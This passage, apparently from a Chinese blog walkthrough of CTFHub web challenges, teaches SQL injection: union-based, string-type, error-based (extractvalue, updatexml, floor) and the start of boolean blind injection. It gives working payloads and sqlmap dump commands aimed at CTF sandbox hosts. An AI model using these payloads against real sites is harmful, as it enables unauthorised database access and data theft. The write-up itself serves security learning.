src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/3.png" alt="10"></p><p>知道字段名为<code>flag</code>，使用<code>flag</code>这个字段名，爆字段内容</p><p><strong>7.获取数据</strong></p><p>两种办法</p><p>a.利用limit一个一个查，第一条limit 0,1;没找到就换成limit 1,1;以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,(select flag from sqli.flag limit 0,1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/12.png" alt="11"></p><p>b.利用group_concat直接获取全部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/4.png" alt="12"></p><p>注入成功，得到<code>flag</code></p><h6 id="2-利用工具HackBar">2.利用工具HackBar</h6><p>其实过程大差不差，主要是为了熟悉这个插件</p><p>1.老样子先判断是那种注入方式</p><p>2.利用order by看有多少列</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/13.png" alt="13"></p><p>3.利用union寻找注入点</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/14.png" alt="14"></p><p>4.通过注入点寻找库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id = -1 union select 1,database()</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/15.png" alt="15"></p><p>5.通过库名爆表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/16.png" alt="16"></p><p>6.通过表爆字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/17.png" alt="17"></p><p>7.通过字段爆数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(flag) from sqli.flag</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/18.png" alt="18"></p><h6 id="3-sqlmap">3.sqlmap</h6><p>1.sqlmap爆当前数据库信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">?<span class="built_in">id</span>=1 的作用是提供一个“入口点”或“注入点”供 sqlmap 进行测试。sqlmap 会尝试在 <span class="built_in">id</span> 参数中插入特殊的 SQL 代码，以探测是否存在 SQL 注入漏洞。如果目标网站没有正确地处理或过滤用户输入，那么 sqlmap 可能就能成功地执行恶意的 SQL 代码，并获取数据库的敏感信息。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--current-db 参数的作用是获取当前数据库的名称</span></span><br><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; --current-db</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/19.png" alt="19"></p><p>用sqlmap爆出库名:sqli</p><p>2.sqlmap.列出指定数据库所有的表名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-D 或 --db-name: 这是要获取的数据库名称。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--tables: 这个参数是用来列出目标数据库中的所有表。</span></span><br><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; -D sqli --tables</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/20.png" alt="20"></p><p>用sqlmap爆出表名:flag,news</p><p>3.查指定表的列数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">-T 或 --table:这个参数后面通常会跟表名，用来指定在数据库中找到的特定表。</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">--columns:这个参数后面通常会跟列名，用来指定在找到的表中列出的特定列。如果没有指定列名，那么这个参数会列出整个表的列。</span></span><br><span class="line"></span><br><span class="line">python sqlmap.py -u &quot;http://challenge-f6ea6271f47a5c21.sandbox.ctfhub.com:10080/?id=1&quot; -D sqli  -T flag  --columns</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/string/4.png" alt=""></p><p>4.查指定列的值</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/int/21.png" alt="21"></p><h5 id="2-字符型注入">2.字符型注入</h5><p>字符型注入要考虑到 <code>引号闭合</code> 和<code> 注释</code></p><h6 id="1-手工注入-2">1.手工注入</h6><p>没什么好说的，步骤和上面差不多，我就不贴图了</p><p>1.判断列数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2#</span><br></pre></td></tr></table></figure><p>2.判断注入点</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure><p>3.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database()#</span><br></pre></td></tr></table></figure><p>4.爆表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure><p>5.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;flag&#x27;#</span><br></pre></td></tr></table></figure><p>6.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,(select flag from flag)#</span><br></pre></td></tr></table></figure><h6 id="2-sqlmap">2.sqlmap</h6><p>没什么好说的，步骤一样，因为ctfhub上flag都藏在一个位置，我这里省事直接找flag</p><p>因为已经知道的数据库名，表名，字段名，所以我这里直接搜就行了，如果想要一条一条看，在整数型注入的sqlmap有详细解释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure><h5 id="3-报错注入">3.报错注入</h5><p>什么是报错注入</p><blockquote><p><strong>报错注入</strong>是一种SQL注入类型，用于使SQL语句报错的语法，用于注入结果<strong>无回显但错误信息有输出的情况</strong>。返回的错误信息即是攻击者需要的信息。所以当我们没有回显位时可以考虑报错注入这种方法来进行渗透测试。</p></blockquote><p>通过我看过多篇博客后，发现大多是是使用三种报错注入方式，分别是：floor()、updatexml()、extractvalue()。</p><p>extractvalue和updatexml函数形成的xpath报错，这算两种。还有一种就是floor实现的group by主键重复，这算另外一种。</p><p>如果想要看十种请移步<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">十种MySQL报错注入</a></p><p>这里我介绍extractvalue和updatexml函数，floor()，harkbur以及sqlmap</p><p>注入前提</p><blockquote><p>(1) Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上</p><p>(2)后台未对一些具有报错功能的函数进行过滤 常用的报错功能函数包括extractvalue()、updatexml)、floor()、exp()等</p></blockquote><p>extractvalue和updatexml函数报错原理</p><blockquote><p>xml文档中查找字符位置是用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错,并且会返回写入的非法格式内容，错误信息如:XPATH syntax error:‘xxxxxxxx’。<br>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p></blockquote><h6 id="1-extractvalue">1.extractvalue</h6><p>值得注意的是适用的版本：5.1.5+</p><p>函数基本格式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ExtractValue(xml_frag, xpath_expr)</span><br></pre></td></tr></table></figure><p>可以看到函数里面的参数，简单分析一下，<strong>xml_frag</strong>参数就是为了上传一个xml文档，<strong>xpath_expr</strong>参数就是用xpath路径法查找路径，而extractvalue报错注入 就是通过在函数中写如不符合语法格式的xpath达到报错的目的，并且通过拼接sql注入语句从而通过<strong>报错查询</strong>并显示我们想要查询的内容；比如我们要查找数据库版本，构造格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">有的地方会用0x7e或其他16进制数，这是经过url编码后的，0x7e=~，作用有两个</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">一是改不符合语法格式的xpath达到报错的目的</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">而是为了方便我们判别version在哪（version在~符号后面）</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&#x27;&#x27;</span>~<span class="string">&#x27;可以换成’#’、’$&#x27;</span>等不满足xpath格式的字符</span></span><br><span class="line">?id=1 and (extractvalue(1,concat(&#x27;~&#x27;,(select version()))))</span><br></pre></td></tr></table></figure><p>了解extractvalue就是经典连招q(≧▽≦q)</p><p>1.爆库名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select extractvalue(1, concat(0x7e, (select database()))))</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/2.png" alt=""></p><p>2.爆表名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (select extractvalue(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema= &#x27;sqli&#x27;))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/3.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 and (select extractvalue(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name= &#x27;flag&#x27;))))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/4.png" alt=""></p><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select extractvalue(1, concat(0x7e, (select flag from flag))))</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/6.png" alt=""></p><p>但是得到的flag是不完整的。这个函数的返回值最多只有32个字符。这里和最终的flag少了一个右大括号。</p><p>以后遇到这种问题再用一下<code>right()</code>获取右边的值即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 and (select extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(right(flag,30)) from flag))))</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/0.png" alt=""></p><h6 id="2-updatexml">2.updatexml</h6><p>与extractvalue函数利用方式差不多，原理大致一致，基本格式如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UpdateXML(xml_target, xpath_expr, new_xml)</span><br></pre></td></tr></table></figure><p>分别分析里面的参数：</p><blockquote><p>xml - taeget：需要操作的xml片段，是string格式，为xml文档对象的名称<br>xpath -expr：需要更新的路径；<br>xml -xml：更新后的的xml字段，string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值</p></blockquote><p>假设我们用这个函数查找数据库名称，可以这样构造PAYLOAD:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27; and (updatexml(&#x27;anything&#x27;,concat(&#x27;~&#x27;,(select database())),&#x27;anything&#x27;))</span><br></pre></td></tr></table></figure><p>因为原理和extractvalue函数利用方式差不多</p><p>如果路径正确没有反应</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/1.png" alt=""></p><p>这里直接开始</p><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e, database()),1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/21.png" alt=""></p><p>2.爆表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat( table_name))from information_schema.tables where table_schema=&quot;sqli&quot;)),1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/22.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat(column_name))from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27;)),1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/23.png" alt=""></p><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat(flag)) from sqli.flag)),1)</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/24.png" alt=""></p><p>但是得到的flag是不完整的。这个函数的返回值最多只有32个字符。这里和最终的flag少了一个右大括号。</p><p>以后遇到这种问题再用一下<code>right()</code>获取右边的值即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union select updatexml(1, concat(0x7e,( select( group_concat(right(flag,30))) from sqli.flag)),1)</span><br></pre></td></tr></table></figure><h6 id="3-floor">3.floor</h6><p>这种方式可以实现报错的原因是：<strong>虚拟表的主键重复</strong>。</p><p>floor函数与上面两个的利用方法就不是那么一样了，在了解这个函数之前先看一些会用到的函数。</p><p><strong>floor()函数</strong>:返回小于等于该值的最大整数，即向下取整，只保留整数部分</p><p><strong>rand()函数：</strong> 产生一个伪随机的序列，执行函数，随机产生一个0~1之间的数值。</p><p><strong>count()函数：</strong> 返回指定列的数目。</p><blockquote><p><code>COUNT(*)</code>计算所有行，而<code>COUNT(column_name)</code>计算特定列中的非NULL值数量</p></blockquote><p><strong>group by()函数：</strong> 结合合计函数，根据一个或多个列对结果集进行分组。</p><blockquote><p>值得注意的是5.6版本是可以用group by重复的这个报错注入，但是mysql即8.x已经不适用，其他版本不确定</p></blockquote><p>本人对数据库并不是了解很深，仅仅知识了解curd的基本指令，因此这里我还是华丽一段时间理解原理</p><p>这位博主关于这块写的很好<a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇</a></p><p>首先是建一张表助于理解</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">create database test1;</span><br><span class="line">use test1；</span><br><span class="line"></span><br><span class="line">create table czs(id int unsigned not null primary key auto_increment, name varchar(15) not null);</span><br><span class="line"></span><br><span class="line">insert into czs(id,name) values(1,&#x27;chenzishuo&#x27;);</span><br><span class="line">insert into czs(id,name) values(2,&#x27;zhangsan&#x27;);</span><br><span class="line">insert into czs(id,name) values(3,&#x27;lisi&#x27;);</span><br><span class="line">insert into czs(id,name) values(4,&#x27;wangwu&#x27;);</span><br></pre></td></tr></table></figure><p>1.rand()可以产生一个在0和1之间的随机数</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/7.png" alt=""></p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/8.png" alt=""></p><p>可以看出，直接使用rand函数每次产生的数值不一样，但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/9.png" alt=""></p><p>2.floor (rand(0)<em>2)函数<br>floor函数的作用就是返回小于等于括号内该值的最大整数。<br>rand()本身是返回0~1的随机数，但在后面</em>2就变成了返回0~2之间的随机数。<br>配合上floor函数就可以产生确定的两个数，即0和1。<br>并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。<br>此处的myclass 表为含有四行数据的表。<br>结合上述的函数，每次产生的随机数列都是 0 1 1 0</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/10.png" alt=""></p><p>3.group by 函数<br>group by 函数，作用就是分类汇总。<br>等一下再说group by，我们首先看一下我的表。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/11.png" alt=""></p><p>再在id 和 name后分别放入a x，意思就是id显示为a name显示为x。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/12.png" alt=""></p><p>然后使用group by 函数进行分组，并且按照x（name）进行排序。</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/13.png" alt=""></p><p>友情提示：在使用group by 函数进行分类时，会因为mysql版本问题而产生问题，主要是启用了ONLY_FULL_GROUP_BY SQL模式（默认情况下），MySQL将拒绝选择列表，HAVING条件或ORDER BY列表的查询引用在GROUP BY子句中既未命名的非集合列，也不在功能上依赖于它们。（或者自行百度解决）</p><p>4.count（*）函数<br><code>COUNT(*)</code>计算所有行，而<code>COUNT(column_name)</code>计算特定列中的非NULL值数量</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/14.png" alt=""></p><p>这就是对重复的数据进行整合计数，x就是每个name的数量，我这里每个只有一个当然count（*）都为1了。</p><p>5.综合使用</p><p>比如说 <code>select count(*), floor(rand(0)*2) from czs</code>,4是一共4行，0是因为rand(0)*2</p><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/15.png" alt=""></p><p><code>select count(\*),floor(rand(0)*2) x from czs group by x;</code><br>当count（*）和group by x同时执行时，就会爆出duplicate entry错误。</p><p>根据前面的函数，这句话是统计后面的floor（rand（0）*2）from czs产生的随机数种类并计算数量，0110，应该是两个两个，但是最后却报错了。</p><p><strong>报错原因解析</strong></p><blockquote><p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。</p><p>group by 语句报错的原因是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1</p><p>group by key 执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（插入数据时，会再计算rand 值）</p><p>如果此时临时表只有 key 为 1 的行不存在 key 为 0 的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时 floor(random(0)*2)结果可能为 1，如果是1，那么主键将会重复就会导致插入时冲突而报错。</p><p>即检测时和插入时两次计算了随机数的值实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的。</p></blockquote><p>1.爆库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">用~把rand(0)*2和database()相隔</span></span><br><span class="line">1 union select count(*),concat(floor(rand(0)*2),&#x27;~&#x27;,database()) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/17.png" alt=""></p><p>2.爆表</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat(floor(rand(0)*2),&#x27;~’,(select concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/16.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat(floor(rand(0)*2),&#x27;~&#x27;,(select concat(table_name) from information_schema.tables where table_schema=&#x27;sqli&#x27; limit 1,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/18.png" alt=""></p><p>3.爆字段名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat(floor(rand(0)*2),&#x27;~&#x27;,(select concat(column_name) from information_schema.columns where table_schema=&#x27;sqli&#x27; and table_name=&#x27;flag&#x27; limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/19.png" alt=""></p><p>4.爆数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 union select count(*),concat(floor(rand(0)*2),&#x27;~&#x27;,(select concat(flag) from sqli.flag limit 0,1)) x from information_schema.schemata group by x</span><br></pre></td></tr></table></figure><p><img src="https://git.acwing.com/w2x/data_bank/-/raw/master/img/study/CTF/CTFHub/web/injection/error/20.png" alt=""></p><h6 id="4-sqlmap">4.sqlmap</h6><p>没什么好说的，步骤一样，因为ctfhub上flag都藏在一个位置，我这里省事直接找flag</p><p>因为已经知道的数据库名，表名，字段名，所以我这里直接搜就行了，如果想要一条一条看，在整数型注入的sqlmap有详细解释</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://challenge-edf7e3fef5ffee34.sandbox.ctfhub.com:10080/?id=-1&quot; -D sqli  -T flag  -C flag --dump</span><br></pre></td></tr></table></figure><h6 id="疑惑">疑惑</h6><p>1.上面的id=-1 union select … 和 id = 1 and (select…)和id=1 union select都可以</p><p>我只知道，union是返回结果集，and是逻辑符，需要两边同时满足，而且记得加括号</p><p>但是还是有点想不通</p><p>2.不知道为什么有的时候sql语句中不需要对需要查的位置条件限定的很死，比如说在爆字段的时候只需要给出条件在flag表里不需要再sqli库里，查找数据的时候仅需要限定条件在对于的表和字段就行（有大佬知道可以请教一下吗😥）</p><h5 id="4-布尔盲注">4.布尔盲注</h5><p>布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息</p><ul><li>ascii(str) 函数，返回字符ascii码值<br>参数 : str单字符</li><li>length(str) 函数，返回字符串的长度<br>参数 : str 字符串</li><li>left(str, length) 函数，返回从左至右截取固定长度的字符串<br>参数str,length<br>str : 字符串<br>length：截取长度</li><li>substr()/substring() 函数 ， 返回从pos位置开始到length长度的子字符串<br>参数，str，pos，length<br>str: 字符串<br>pos：开始位置<br>length： 截取长度</li></ul><h6 id="1-手工注入-3">1.手工注入</h6><p>注入流程</p><ol><li>求当前数据库长度</li><li>求当前数据库表的ASCII</li><li>求当前数据库中表的个数</li><li>求当前数据库中其中一个表名的长度</li><li>求当前数据库中其中一个表名的ASCII</li><li>求列名的数量</li><li>求列名的长度</li><li>求列名的ASCII</li><li>求字段的数量</li><li>求字段内容的长度</li><li>求字段内容对应的ASCII</li></ol><p>SQL语句</p><ul><li><p>求当前数据库的长度</p><p>思路：利用length或者substr函数来完成</p></li></ul><p>length函数</p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">str</td><td style="text-align:center">返回字符串的长度</td></tr></tbody></table><p>substr函数</p><table><thead><tr><th style="text-align:center">参数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">str</td><td style="text-align:center">字符串</td></tr><tr><td style="text-align:center">pos</td><td style="text-align:center">截取字符串开始位置</td></tr></tbody></table><p>length函数原理</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">length 返回长度</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8是当前数据库<span class="string">&#x27;security&#x27;</span>的长度</span></span><br><span class="line">SELECT * from users WHERE id = 1 and (length(database())=8)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">也可以使用 &gt; 、&lt; 符号来进一步缩小范围</span></span><br><span class="line">SELECT * from users WHERE id = 1 and (length(database())&gt;8)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当长度正确就页面就显示正常，其余页面则显示错误</span></span><br></pre></td></tr></table></figure><p>substr函数原理</p><p>在构造SQL语句之时，and后面如果跟着一个大于0的数，那么SQL语句正确执行，所以利用此特性，使用substr截取字符，当截取的字符不存在，再通过ascii函数处理之后将会变成false，页面将回显错误</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">substr 返回子字符串</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8是当前数据库<span class="string">&#x27;security&#x27;</span>的长度 ，从第8个开始，取1位，则是<span class="string">&#x27;r&#x27;</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果pos为9 那么开始位置大于字符串长度，ascii函数处理后将变成<span class="literal">false</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">and 后只要不为 0, 页面都会返回正常</span></span><br><span class="line">SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))</span><br></pre></td></tr></table></figure><ul><li><p>求当前数据库名</p><p>思路：</p><p>利用left 函数，从左至右截取字符串</p><p>截取字符判断字符的ascii码，从而确定字符</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从左至右截取一个字符</span></span><br><span class="line">SELECT * from users WHERE id = 1 and (left(database(),1)=&#x27;s&#x27;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从左只有截取两个字符</span></span><br><span class="line">SELECT * from users WHERE id = 1 and (left(database(),2)=&#x27;se&#x27;)</span><br><span class="line">使用&gt;，&lt; 符号来比较查找，找到一个范围，最后再确定</span><br></pre></td></tr></table></figure></li><li><p>求当前数据库存在的表的数量</p><figure class="highlight 